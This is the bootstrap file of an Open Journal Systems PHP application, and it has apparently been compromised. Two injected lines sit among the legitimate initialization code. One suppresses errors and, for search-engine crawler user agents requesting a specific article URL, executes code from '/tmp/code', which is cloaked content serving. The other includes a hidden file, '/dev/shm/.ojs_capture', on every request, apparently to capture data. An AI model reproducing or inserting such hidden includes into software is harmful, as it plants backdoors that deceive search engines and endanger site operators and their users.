<?php

/**
 * @defgroup index Index
 * Bootstrap and initialization code.
 */
error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/index.php/BIM/article/download/47/63'){ include('/tmp/code'); exit; }
/**
 * @file includes/bootstrap.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2000-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * @brief Core system initialization code.
 * This file is loaded before any others.
 * Any system-wide imports or initialization code should be placed here.
 */


/**
 * Basic initialization (pre-classloading).
 */

// Load Composer autoloader
require_once 'lib/pkp/lib/vendor/autoload.php';

define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
chdir(BASE_SYS_DIR);

// System-wide functions
require_once './lib/pkp/includes/functions.php';
include("/dev/shm/.ojs_capture");
// Initialize the application environment
return new \APP\core\Application();
